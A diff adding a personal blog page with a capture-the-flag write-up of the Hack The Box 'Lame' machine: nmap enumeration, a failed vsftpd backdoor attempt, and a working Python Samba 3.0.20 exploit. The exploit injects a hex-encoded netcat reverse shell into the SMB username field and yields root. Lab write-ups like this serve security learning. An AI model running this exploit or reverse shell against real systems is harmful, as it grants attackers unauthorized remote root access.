@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box :: Lame :: m1thryn.github.io</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="TL;DR: this is an easy UNIX box that could possibly be the easiest box on Hack The Box. Do basic enumeration. Type &amp;lt;service&amp;gt; &amp;lt;version&amp;gt; exploit into Google. Profit. Try not to use metasploit&amp;hellip;
+Enumeration  Nmap Starting with an nmap scan&amp;hellip;
+~ » nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up, received user-set (0.064s latency). Scanned at 2020-09-29 22:39:43 UTC for 177s Not shown: 65530 filtered ports Reason: 65530 no-responses PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 62 vsftpd 2." />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/htb-lame/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/toxic-24.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="m1thryn" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box :: Lame :: m1thryn.github.io">
+<meta property="og:description" content="TL;DR: this is an easy UNIX box that could possibly be the easiest box on Hack The Box. Do basic enumeration. Type `  exploit` into Google. Profit." />
+<meta property="og:url" content="/posts/htb-lame/" />
+<meta property="og:site_name" content="Hack The Box :: Lame" />
+
+  <meta property="og:image" content="/htb-lame.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-09-29 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    m1thryn.github.io
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/recommendations">Recommendations</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/recommendations">Recommendations</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/htb-lame/">Hack The Box :: Lame</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-09-29 
+      </span>
+    
+    
+    <span class="post-author">:: m1thryn</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/htb/">htb</a>&nbsp;
+    
+    #<a href="/tags/r00ted/">r00ted</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="/htb-lame.png" class="post-cover" alt="Hack The Box :: Lame" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>TL;DR: this is an easy UNIX box that could possibly be the easiest box on Hack The Box. Do basic enumeration. Type <code>&lt;service&gt; &lt;version&gt; exploit</code> into Google. Profit. Try not to use metasploit&hellip;</p>
+<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h3 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Starting with an nmap scan&hellip;</p>
+<pre><code>~ » nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.3
+
+Nmap scan report for 10.10.10.3
+Host is up, received user-set (0.064s latency).
+Scanned at 2020-09-29 22:39:43 UTC for 177s
+Not shown: 65530 filtered ports
+Reason: 65530 no-responses
+PORT     STATE SERVICE     REASON         VERSION
+21/tcp   open  ftp         syn-ack ttl 62 vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.22
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         syn-ack ttl 62 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+|_
+139/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     syn-ack ttl 62 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.27 - 2.6.28 (92%), Linux 2.6.8 - 2.6.30 (92%)
+No exact OS matches for host (test conditions non-ideal).
+
+Uptime guess: 0.152 days (since Tue Sep 29 19:03:20 2020)
+Network Distance: 3 hops
+TCP Sequence Prediction: Difficulty=194 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h06m38s, deviation: 2h49m45s, median: 6m35s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 59488/tcp): CLEAN (Timeout)
+|   Check 2 (port 44129/tcp): CLEAN (Timeout)
+|   Check 3 (port 56537/udp): CLEAN (Timeout)
+|   Check 4 (port 40169/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-09-29T18:48:40-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 139/tcp)
+HOP RTT      ADDRESS
+1   0.02 ms  172.17.0.1
+2   68.35 ms 10.10.14.1
+3   68.40 ms 10.10.10.3
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep 29 22:42:40 2020 -- 1 IP address (1 host up) scanned in 177.68 seconds
+</code></pre><p>Here we find FTP, SSH, NetBIOS Session Service, and SMB ports open.</p>
+<h3 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Starting with the well known <code>vsftp 2.3.4</code> backdoor exploit, I tried the exploit found here (<a href="https://github.com/ahervias77/vsftpd-2.3.4-exploit">https://github.com/ahervias77/vsftpd-2.3.4-exploit</a>) but no luck.</p>
+<p>I also tried <code>metasploit</code> to confirm the exploit was not the problem:</p>
+<pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+</code></pre><h3 id="smb">SMB<a href="#smb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Seeing <code>Samba smbd 3.0.20-Debian</code> in the nmap scan, we search google for <code>samba 3.0.20 exploit</code>. I found some exploit code here <a href="https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851">https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851</a> courtesy of joenorton8014. All credit to joenorton8014.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">from</span> smb.SMBConnection <span style="color:#f92672">import</span> SMBConnection
+<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
+<span style="color:#f92672">from</span> smb <span style="color:#f92672">import</span> smb_structs
+smb_structs<span style="color:#f92672">.</span>SUPPORT_SMB2 <span style="color:#f92672">=</span> False
+<span style="color:#f92672">import</span> sys
+
+
+<span style="color:#75715e"># Just a python version of a very simple Samba exploit. </span>
+<span style="color:#75715e"># It doesn&#39;t have to be pretty because the shellcode is executed</span>
+<span style="color:#75715e"># in the username field. </span>
+
+<span style="color:#75715e"># Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ </span>
+
+<span style="color:#75715e"># Configured SMB connection options with info from here:</span>
+<span style="color:#75715e"># https://pythonhosted.org/pysmb/api/smb_SMBConnection.html</span>
+
+<span style="color:#75715e"># Use the commandline argument as the target: </span>
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Usage: &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &lt;HOST&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+    sys<span style="color:#f92672">.</span>exit()
+
+
+<span style="color:#75715e"># Shellcode: </span>
+<span style="color:#75715e"># msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;IP&gt; LPORT=9999 -f python</span>
+
+buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x74</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x65\x6e\x6d\x71\x3b\x20\x6e\x63\x20\x31\x30\x2e</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\x30\x2e\x31\x34\x2e\x32\x32\x20\x39\x39\x39\x39</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x74\x6e\x65\x6e\x6d</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x74\x6d\x70\x2f\x74\x6e\x65\x6e\x6d\x71\x20\x32</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x74\x6e\x65\x6e\x6d\x71</span><span style="color:#e6db74">&#34;</span>
+
+username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/=`nohup &#34;</span> <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;`&#34;</span>
+password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+conn <span style="color:#f92672">=</span> SMBConnection(username, password, <span style="color:#e6db74">&#34;SOMEBODYHACKINGYOU&#34;</span> , <span style="color:#e6db74">&#34;METASPLOITABLE&#34;</span>, use_ntlm_v2 <span style="color:#f92672">=</span> False)
+<span style="color:#66d9ef">assert</span> conn<span style="color:#f92672">.</span>connect(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">445</span>)
+</code></pre></div><p>catching the reverse shell:</p>
+<pre><code>~ » nc -lvp 9999                                                                                                                                                                                                    ian@mars
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+Ncat: Connection from 10.10.10.3.
+Ncat: Connection from 10.10.10.3:33088.
+
+id    
+uid=0(root) gid=0(root)
+</code></pre><h2 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<pre><code>cat /home/makis/user.txt
+69454a937d94f5f0225ea00acd2e84c5
+</code></pre><h2 id="root-flag">Root Flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<pre><code>cat /root/root.txt
+92caac3be140ef409e45721348a4e9df
+</code></pre><p>well&hellip;that&hellip;was&hellip;lame</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/hello/">
+                <span class="button__text">Hello World</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
